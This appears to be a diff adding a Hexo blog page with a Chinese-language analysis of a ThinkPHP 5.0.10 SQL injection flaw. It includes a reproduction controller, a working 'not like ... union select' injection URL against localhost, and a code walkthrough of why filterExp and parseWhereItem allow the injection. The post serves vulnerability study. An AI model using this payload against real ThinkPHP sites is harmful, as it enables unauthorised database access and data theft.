@@ -1,0 +1,487 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>thinkphp5框架SQL注入分析：parseWhereItem+filterValue - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="thinkphp5框架SQL注入分析：parseWhereItem+filterValue">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-25 09:22" pubdate>
+        2021年7月25日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      472 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      6
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">thinkphp5框架SQL注入分析：parseWhereItem+filterValue</h1>
+            
+            <div class="markdown-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞概要：</p>
+<ul>
+<li>漏洞存在于 Mysql 类的 parseWhereItem 方法中，数据未经过过滤就拼接进sql语句。</li>
+<li><strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，</li>
+</ul>
+<p>漏洞影响版本： <strong>ThinkPHP=5.0.10</strong> </p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>控制器</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$username</span> = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>])-&gt;select();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/localhost/tp</span>501/public/?username[<span class="hljs-number">0</span>]=not like&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=%%&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=<span class="hljs-number">233</span>&amp;username[<span class="hljs-number">2</span>]=) <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">user</span>()%23</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/Wgi7Bq"><img src="https://z3.ax1x.com/2021/07/25/Wgi7Bq.png" srcset="/img/loading.gif" lazyload alt="Wgi7Bq.png"></a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>我们传递的参数会先进入Request类的input方法，然后经过强制类型转换和filterValue方法的处理</p>
+<p>1.get</p>
+<p>$_GET数组被赋值给$this-&gt;get，然后进入input</p>
+<p><a href="https://imgtu.com/i/WgiO4U"><img src="https://z3.ax1x.com/2021/07/25/WgiO4U.png" srcset="/img/loading.gif" lazyload alt="WgiO4U.png"></a></p>
+<p>2.input</p>
+<p>array_walk_recursive 会对$data数组中的每个成员递归地应用filterValue函数，</p>
+<p><a href="https://imgtu.com/i/WgijCF"><img src="https://z3.ax1x.com/2021/07/25/WgijCF.png" srcset="/img/loading.gif" lazyload alt="WgijCF.png"></a></p>
+<p>3.filterValue</p>
+<p>调用filterExp对数组中的每一个值进行过滤</p>
+<p><a href="https://imgtu.com/i/Wgiv34"><img src="https://z3.ax1x.com/2021/07/25/Wgiv34.png" srcset="/img/loading.gif" lazyload alt="Wgiv34.png"></a></p>
+<p>4.filterExp</p>
+<p>可以看到没有过滤NOT LIKE</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterExp</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-comment">// 过滤查询特殊字符</span><br>       <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$value</span>) &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;<br>           <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>       &#125;<br>       <span class="hljs-comment">// TODO 其他安全过滤</span><br>   &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="parseWhereItem"><a href="#parseWhereItem" class="headerlink" title="parseWhereItem"></a>parseWhereItem</h2><p>1.控制器</p>
+<p><a href="https://imgtu.com/i/Wgi5cj"><img src="https://z3.ax1x.com/2021/07/25/Wgi5cj.png" srcset="/img/loading.gif" lazyload alt="Wgi5cj.png"></a></p>
+<p>2.where</p>
+<p>调用parseWhere把username数组赋值给<code>$this-&gt;options[&#39;where&#39;][&#39;AND&#39;]</code></p>
+<p><a href="https://imgtu.com/i/WgixgJ"><img src="https://z3.ax1x.com/2021/07/25/WgixgJ.png" srcset="/img/loading.gif" lazyload alt="WgixgJ.png"></a></p>
+<p>3.parseWhereExp</p>
+<p>主要是赋值和拼接数组的具体过程</p>
+<p><a href="https://imgtu.com/i/WgiIjs"><img src="https://z3.ax1x.com/2021/07/25/WgiIjs.png" srcset="/img/loading.gif" lazyload alt="WgiIjs.png"></a></p>
+<p>4.select</p>
+<ul>
+<li>select构建sql语句</li>
+<li>query执行构建好的sql语句</li>
+</ul>
+<p><a href="https://imgtu.com/i/WgiTun"><img src="https://z3.ax1x.com/2021/07/25/WgiTun.png" srcset="/img/loading.gif" lazyload alt="WgiTun.png"></a></p>
+<p>5.select</p>
+<p>构造sql语句，进入parseWhere</p>
+<p><a href="https://imgtu.com/i/WgiHH0"><img src="https://z3.ax1x.com/2021/07/25/WgiHH0.png" srcset="/img/loading.gif" lazyload alt="WgiHH0.png"></a></p>
+<p>6.parseWhere</p>
+<p>if条件不满足，只执行了buildWhere</p>
+<p><a href="https://imgtu.com/i/WgiLNT"><img src="https://z3.ax1x.com/2021/07/25/WgiLNT.png" srcset="/img/loading.gif" lazyload alt="WgiLNT.png"></a></p>
+<p><a href="https://imgtu.com/i/WgiqEV"><img src="https://z3.ax1x.com/2021/07/25/WgiqEV.png" srcset="/img/loading.gif" lazyload alt="WgiqEV.png"></a></p>
+<p>7.buildWhere</p>
+<p>调用parseWhereItem</p>
+<p><a href="https://imgtu.com/i/WgFpuR"><img src="https://z3.ax1x.com/2021/07/25/WgFpuR.png" srcset="/img/loading.gif" lazyload alt="WgFpuR.png"></a></p>
+<p>8.parseWhereItem</p>
+<p>简化了下，只放了实际执行的代码</p>
+<ol>
+<li>parseKey给username拼接上了反引号</li>
+<li>$exp把小写的not like转成大写</li>
+<li>$value等于$val[1]</li>
+<li>在这里parseValue的功能就是给传入参数拼接上单引号</li>
+<li>逻辑操作符$logic来源于可控的$val[2]，然后被拼接进sql语句，造成了sql注入</li>
+</ol>
+<p><a href="https://imgtu.com/i/WgF9D1"><img src="https://z3.ax1x.com/2021/07/25/WgF9D1.png" srcset="/img/loading.gif" lazyload alt="WgF9D1.png"></a></p>
+<p>9.query执行sql语句</p>
+<p><a href="https://imgtu.com/i/Wgizv9"><img src="https://z3.ax1x.com/2021/07/25/Wgizv9.png" srcset="/img/loading.gif" lazyload alt="Wgizv9.png"></a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/24/Weblogic%E5%AD%A6%E4%B9%A0%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="hidden-mobile">Weblogic学习：T3反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
